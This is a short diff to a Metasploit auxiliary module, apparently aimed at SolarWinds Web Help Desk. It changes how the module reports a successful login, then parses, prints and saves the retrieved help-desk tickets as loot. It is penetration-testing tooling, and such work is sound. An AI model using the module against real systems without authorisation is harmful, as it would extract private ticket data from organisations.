@@ -53,11 +53,15 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    fail_with(Failure::UnexpectedReply, 'Unexpected Reply') unless res&.code == 200
+    fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + res.to_s) unless res&.code == 200
 
-    json = res.get_json_document
-    if json.to_s.include?('shortSubject')
-      print_good('Successfully authenticated and tickets retrieved:' + json.to_s)
+    body = res.body
+    if body.include?('shortSubject')
+      jbody = JSON.parse(body)
+      print_good('Successfully authenticated and tickets retrieved:')
+      print_good(JSON.pretty_generate(jbody))
+      file = store_loot('solarwinds_webhelpdesk.json', 'text/json', datastore['USER'], jbody)
+      print_good("Saved tickets to #{file}")
     end
   end
 end
